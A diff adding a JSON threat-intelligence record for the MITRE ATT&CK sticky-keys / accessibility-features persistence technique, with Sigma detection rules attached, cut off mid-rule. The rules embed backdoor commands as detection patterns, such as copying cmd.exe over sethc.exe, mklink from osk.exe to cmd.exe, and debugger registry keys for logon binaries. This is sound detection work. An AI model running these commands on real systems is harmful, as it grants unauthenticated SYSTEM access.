@@ -1,0 +1,249 @@
+{
+    "id": "T1546.008",
+    "name": "Accessibility Features",
+    "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\nTwo common accessibility programs are `C:WindowsSystem32sethc.exe`, launched when the shift key is pressed five times and `C:WindowsSystem32utilman.exe`, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in `%systemdir%`, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](T1546.012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., `C:WindowsSystem32utilman.exe`) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](T1021.001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)\n* On-Screen Keyboard: `C:WindowsSystem32osk.exe`\n* Magnifier: `C:WindowsSystem32Magnify.exe`\n* Narrator: `C:WindowsSystem32Narrator.exe`\n* Display Switcher: `C:WindowsSystem32DisplaySwitch.exe`\n* App Switcher: `C:WindowsSystem32AtBroker.exe`",
+    "platforms": "Windows",
+    "kill_chain_phases": "Privilege Escalation, Persistence",
+    "data_sources": "Process: Process Creation, Windows Registry: Windows Registry Key Modification, Command: Command Execution, File: File Creation, File: File Modification",
+    "detection": "Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within `HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Options`.",
+    "url": "https://attack.mitre.org/techniques/T1546/008",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1546.008",
+                "atomic_attack_guid": "51ef369c-5e87-4f33-88cd-6d61be63edf2",
+                "atomic_attack_name": "Create Symbolic Link From osk.exe to cmd.exe",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "File Deletion Via Del",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_del_execution.yml",
+                        "remote_content": "title: File Deletion Via Del\nid: 379fa130-190e-4c3f-b7bc-6c8e834485f3\nstatus: test\ndescription: |\n    Detects execution of the builtin \"del\"/\"erase\" commands in order to delete files.\n    Adversaries may delete files left behind by the actions of their intrusion activity.\n    Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\n    Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113\ndate: 2022-01-15\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_flags:\n        CommandLine|contains|windash:\n            - ' -f' # Force deleting of read-only files.\n            - ' -s' # Delete specified files from all subdirectories.\n            - ' -q' # Quiet mode, do not ask if ok to delete on global wildcard\n    condition: all of selection_*\nfalsepositives:\n    - False positives levels will differ Depending on the environment. You can use a combination of ParentImage and other keywords from the CommandLine field to filter legitimate activity\nlevel: low\n"
+                    },
+                    {
+                        "rule_name": "Greedy File Deletion Using Del",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_del_greedy_deletion.yml",
+                        "remote_content": "title: Greedy File Deletion Using Del\nid: 204b17ae-4007-471b-917b-b917b315c5db\nstatus: test\ndescription: Detects execution of the \"del\" builtin command to remove files using greedy/wildcard expression. This is often used by malware to delete content of folders that perhaps contains the initial malware infection or to delete evidence.\nreferences:\n    - https://www.joesandbox.com/analysis/509330/0/html#1044F3BDBE3BB6F734E357235F4D5898582D\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113 , X__Junior (Nextron Systems)\ndate: 2021-12-02\nmodified: 2023-09-11\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example:\n    #   del C:\\ProgramData\\*.dll & exit\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_extensions:\n        CommandLine|contains:\n            - '\\\\\\*.au3'\n            - '\\\\\\*.dll'\n            - '\\\\\\*.exe'\n            - '\\\\\\*.js'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Copy From or To System Directory",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir.yml",
+                        "remote_content": "title: Suspicious Copy From or To System Directory\nid: fff9d2b7-e11c-4a69-93d3-40ef66189767\nrelated:\n    - id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900\n      type: derived\nstatus: test\ndescription: |\n    Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\n    Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\nreferences:\n    - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120\n    - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html\n    - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/\nauthor: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-07-03\nmodified: 2023-08-29\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n              - '\\robocopy.exe'\n              - '\\xcopy.exe'\n        - OriginalFileName:\n              - 'robocopy.exe'\n              - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n            - '\\WinSxS'\n    condition: 1 of selection_* and target\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Potential Privilege Escalation Using Symlink Between Osk and Cmd",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_mklink_osk_cmd.yml",
+                        "remote_content": "title: Potential Privilege Escalation Using Symlink Between Osk and Cmd\nid: e9b61244-893f-427c-b287-3e708f321c6b\nstatus: test\ndescription: Detects the creation of a symbolic link between \"cmd.exe\" and the accessibility on-screen keyboard binary (osk.exe) using \"mklink\". This technique provides an elevated command prompt to the user from the login screen without the need to log in.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/5c1e6f1b4fafd01c8d1ece85f510160fc1275fbf/atomics/T1546.008/T1546.008.md\n    - https://ss64.com/nt/mklink.html\nauthor: frack113\ndate: 2022-12-11\nmodified: 2022-12-20\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.008\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'mklink'\n            - '\\osk.exe'\n            - '\\cmd.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1546.008",
+                "atomic_attack_guid": "934e90cf-29ca-48b3-863c-411737ad44e3",
+                "atomic_attack_name": "Replace binary of sticky keys",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Persistence Via Sticky Key Backdoor",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_sticky_keys_replace.yml",
+                        "remote_content": "title: Persistence Via Sticky Key Backdoor\nid: 1070db9a-3e5d-412e-8e7b-7183b616e1b3\nstatus: test\ndescription: |\n    By replacing the sticky keys executable with the local admins CMD executable, an attacker is able to access a privileged windows console session without authenticating to the system.\n    When the sticky keys are \"activated\" the privilleged shell is launched.\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html\n    - https://www.clearskysec.com/wp-content/uploads/2020/02/ClearSky-Fox-Kitten-Campaign-v1.pdf\n    - https://learn.microsoft.com/en-us/archive/blogs/jonathantrull/detecting-sticky-key-backdoors\nauthor: Sreeman\ndate: 2020-02-18\nmodified: 2023-03-07\ntags:\n    - attack.t1546.008\n    - attack.privilege-escalation\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'copy '\n            - '/y '\n            - 'C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\sethc.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Copy From or To System Directory",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir.yml",
+                        "remote_content": "title: Suspicious Copy From or To System Directory\nid: fff9d2b7-e11c-4a69-93d3-40ef66189767\nrelated:\n    - id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900\n      type: derived\nstatus: test\ndescription: |\n    Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\n    Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\nreferences:\n    - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120\n    - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html\n    - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/\nauthor: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-07-03\nmodified: 2023-08-29\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n              - '\\robocopy.exe'\n              - '\\xcopy.exe'\n        - OriginalFileName:\n              - 'robocopy.exe'\n              - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n            - '\\WinSxS'\n    condition: 1 of selection_* and target\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "ae215552-081e-44c7-805f-be16f975c8a2",
+                    "2fdefcb3-dbda-401e-ae23-f0db027628bc",
+                    "70e52b04-2a0c-4cea-9d18-7149f1df9dc5",
+                    "1070db9a-3e5d-412e-8e7b-7183b616e1b3",
+                    "c2c76b77-32be-4d1f-82c9-7e544bdfe0eb",
+                    "51cbac1e-eee3-4a90-b1b7-358efb81fa0a",
+                    "baca5663-583c-45f9-b5dc-ea96a22ce542",
+                    "e9b61244-893f-427c-b287-3e708f321c6b"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "ae215552-081e-44c7-805f-be16f975c8a2",
+                        "lookup_data": {
+                            "description": "Detects the registration of a debugger for a program that is available in the logon screen (sticky key backdoor).",
+                            "raw": "author: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019/09/06\ndescription: Detects the registration of a debugger for a program that is available\n  in the logon screen (sticky key backdoor).\ndetection:\n  condition: all of selection*\n  selection1:\n    CommandLine|contains: \\CurrentVersion\\Image File Execution Options\\\n  selection2:\n    CommandLine|contains:\n    - sethc.exe\n    - utilman.exe\n    - osk.exe\n    - magnify.exe\n    - narrator.exe\n    - displayswitch.exe\n    - atbroker.exe\n    - HelpPane.exe\nfalsepositives:\n- Unknown\nid: ae215552-081e-44c7-805f-be16f975c8a2\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/06\nreferences:\n- https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/\n- https://bazaar.abuse.ch/sample/6f3aa9362d72e806490a8abce245331030d1ab5ac77e400dd475748236a6cc81/\nstatus: test\ntags:\n- attack.persistence\n- attack.privilege_escalation\n- attack.t1546.008\ntitle: Suspicious Debugger Registration Cmdline\n",
+                            "sigma:id": "ae215552-081e-44c7-805f-be16f975c8a2",
+                            "title": "Suspicious Debugger Registration Cmdline",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "2fdefcb3-dbda-401e-ae23-f0db027628bc",
+                        "lookup_data": {
+                            "description": "Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen",
+                            "raw": "author: Florian Roth (Nextron Systems), @twjackomo, Jonhnathan Ribeiro, oscd.community\ndate: 2018/03/15\ndescription: Detects the usage and installation of a backdoor that uses an option\n  to register a malicious debugger for built-in tools that are accessible in the login\n  screen\ndetection:\n  condition: selection_process\n  selection_process:\n    CommandLine|contains:\n    - sethc.exe\n    - utilman.exe\n    - osk.exe\n    - Magnify.exe\n    - Narrator.exe\n    - DisplaySwitch.exe\n    Image|endswith: \\cmd.exe\n    ParentImage|endswith: \\winlogon.exe\nfalsepositives:\n- Unlikely\nid: 2fdefcb3-dbda-401e-ae23-f0db027628bc\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/09/12\nreferences:\n- https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/\nrelated:\n- id: baca5663-583c-45f9-b5dc-ea96a22ce542\n  type: derived\nstatus: test\ntags:\n- attack.privilege_escalation\n- attack.persistence\n- attack.t1546.008\n- car.2014-11-003\n- car.2014-11-008\ntitle: Sticky Key Like Backdoor Usage\n",
+                            "sigma:id": "2fdefcb3-dbda-401e-ae23-f0db027628bc",
+                            "title": "Sticky Key Like Backdoor Usage",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "70e52b04-2a0c-4cea-9d18-7149f1df9dc5",
+                        "lookup_data": {
+                            "capec": "CAPEC-558",
+                            "mitre-attack-id": "T1546.008",
+                            "mitre-cti:description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)\n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>",
+                            "mitre-cti:name": "Accessibility Features",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Paul Speulstra, AECOM Global Security Operations Center'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5', 'type': 'attack-pattern', 'created': '2020-01-24T14:32:40.315Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1546.008', 'url': 'https://attack.mitre.org/techniques/T1546/008'}, {'external_id': 'CAPEC-558', 'source_name': 'capec', 'url': 'https://capec.mitre.org/data/definitions/558.html'}, {'url': 'https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html', 'description': 'Glyer, C., Kazanciyan, R. (2012, August 20). The “Hikit” Rootkit: Advanced and Persistent Attack Techniques (Part 1). Retrieved June 6, 2016.', 'source_name': 'FireEye Hikit Rootkit'}, {'url': 'https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom', 'description': 'Maldonado, D., McGuffin, T. (2016, August 6). Sticky Keys to the Kingdom. Retrieved July 5, 2017.', 'source_name': 'DEFCON2016 Sticky Keys'}, {'url': 'http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/', 'description': 'Tilbury, C. (2014, August 28). Registry Analysis with CrowdResponse. Retrieved November 12, 2014.', 'source_name': 'Tilbury 2014'}, {'source_name': 'Narrator Accessibility Abuse', 'url': 'https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html', 'description': \"Comi, G. (2019, October 19). Abusing Windows 10 Narrator's 'Feedback-Hub' URI for Fileless Persistence. Retrieved April 28, 2020.\"}], 'modified': '2020-05-13T20:37:30.048Z', 'name': 'Accessibility Features', 'description': 'Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\\n\\nTwo common accessibility programs are <code>C:\\\\Windows\\\\System32\\\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\\\Windows\\\\System32\\\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\\n\\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\\n\\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\\\Windows\\\\System32\\\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\\n\\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)\\n\\n* On-Screen Keyboard: <code>C:\\\\Windows\\\\System32\\\\osk.exe</code>\\n* Magnifier: <code>C:\\\\Windows\\\\System32\\\\Magnify.exe</code>\\n* Narrator: <code>C:\\\\Windows\\\\System32\\\\Narrator.exe</code>\\n* Display Switcher: <code>C:\\\\Windows\\\\System32\\\\DisplaySwitch.exe</code>\\n* App Switcher: <code>C:\\\\Windows\\\\System32\\\\AtBroker.exe</code>', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}], 'x_mitre_detection': 'Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options</code>.', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['File: File Modification', 'File: File Creation', 'Windows Registry: Windows Registry Key Modification', 'Process: Process Creation', 'Command: Command Execution'], 'x_mitre_permissions_required': ['Administrator'], 'x_mitre_effective_permissions': ['SYSTEM']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1070db9a-3e5d-412e-8e7b-7183b616e1b3",
+                        "lookup_data": {
+                            "description": "By replacing the sticky keys executable with the local admins CMD executable, an attacker is able to access a privileged windows console session without authenticating to the system.\nWhen the sticky keys are \"activated\" the privilleged shell is launched.\n",
+                            "raw": "author: Sreeman\ndate: 2020/02/18\ndescription: 'By replacing the sticky keys executable with the local admins CMD executable,\n  an attacker is able to access a privileged windows console session without authenticating\n  to the system.\n\n  When the sticky keys are \"activated\" the privilleged shell is launched.\n\n  '\ndetection:\n  condition: selection\n  selection:\n    CommandLine: copy /y C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\sethc.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentProcess\nid: 1070db9a-3e5d-412e-8e7b-7183b616e1b3\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/04/19\nreferences:\n- https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html\n- https://www.clearskysec.com/wp-content/uploads/2020/02/ClearSky-Fox-Kitten-Campaign-v1.pdf\nstatus: experimental\ntags:\n- attack.t1546.008\n- attack.privilege_escalation\ntitle: Sticky-Key Backdoor Copy Cmd.exe\n",
+                            "sigma:id": "1070db9a-3e5d-412e-8e7b-7183b616e1b3",
+                            "title": "Sticky-Key Backdoor Copy Cmd.exe",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c2c76b77-32be-4d1f-82c9-7e544bdfe0eb",
+                        "lookup_data": {
+                            "description": "Detects potential suspicious behaviour using secedit.exe. Such as exporting or modifying the security policy",
+                            "raw": "author: Janantha Marasinghe\ndate: 2022/11/18\ndescription: Detects potential suspicious behaviour using secedit.exe. Such as exporting\n  or modifying the security policy\ndetection:\n  condition: selection_img and (1 of selection_flags_*)\n  selection_flags_configure:\n    CommandLine|contains|all:\n    - /configure\n    - /db\n  selection_flags_discovery:\n    CommandLine|contains|all:\n    - /export\n    - /cfg\n  selection_img:\n  - Image|endswith: \\secedit.exe\n  - OriginalFileName: SeCEdit\nfalsepositives:\n- Legitimate administrative use\nid: c2c76b77-32be-4d1f-82c9-7e544bdfe0eb\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/30\nreferences:\n- https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d\n- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/secedit\nstatus: experimental\ntags:\n- attack.discovery\n- attack.persistence\n- attack.defense_evasion\n- attack.credential_access\n- attack.privilege_escalation\n- attack.t1562.002\n- attack.t1547.001\n- attack.t1505.005\n- attack.t1556.002\n- attack.t1562\n- attack.t1574.007\n- attack.t1564.002\n- attack.t1546.008\n- attack.t1546.007\n- attack.t1547.014\n- attack.t1547.010\n- attack.t1547.002\n- attack.t1557\n- attack.t1082\ntitle: Potential Suspicious Activity Using SeCEdit\n",
+                            "sigma:id": "c2c76b77-32be-4d1f-82c9-7e544bdfe0eb",
+                            "title": "Potential Suspicious Activity Using SeCEdit",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "51cbac1e-eee3-4a90-b1b7-358efb81fa0a",
+                        "lookup_data": {
+                            "description": "Detects potential tampering with Windows Defender settings such as adding exclusion using wmic",
+                            "raw": "author: frack113\ndate: 2022/12/11\ndescription: Detects potential tampering with Windows Defender settings such as adding\n  exclusion using wmic\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains: /Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender\n  selection_img:\n  - OriginalFileName: wmic.exe\n  - Image|endswith: \\WMIC.exe\nfalsepositives:\n- Unknown\nid: 51cbac1e-eee3-4a90-b1b7-358efb81fa0a\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/5c1e6f1b4fafd01c8d1ece85f510160fc1275fbf/atomics/T1562.001/T1562.001.md\n- https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1546.008\ntitle: WMIC Tamper Windows Defender\n",
+                            "sigma:id": "51cbac1e-eee3-4a90-b1b7-358efb81fa0a",
+                            "title": "WMIC Tamper Windows Defender",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "baca5663-583c-45f9-b5dc-ea96a22ce542",
+                        "lookup_data": {
+                            "description": "Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen",
+                            "raw": "author: Florian Roth (Nextron Systems), @twjackomo, Jonhnathan Ribeiro, oscd.community\ndate: 2018/03/15\ndescription: Detects the usage and installation of a backdoor that uses an option\n  to register a malicious debugger for built-in tools that are accessible in the login\n  screen\ndetection:\n  condition: selection_registry\n  selection_registry:\n    TargetObject|endswith:\n    - \\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger\n    - \\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\\Debugger\n    - \\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\Debugger\n    - \\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Magnify.exe\\Debugger\n    - \\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Narrator.exe\\Debugger\n    - \\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe\\Debugger\n    - \\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\atbroker.exe\\Debugger\n    - \\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File 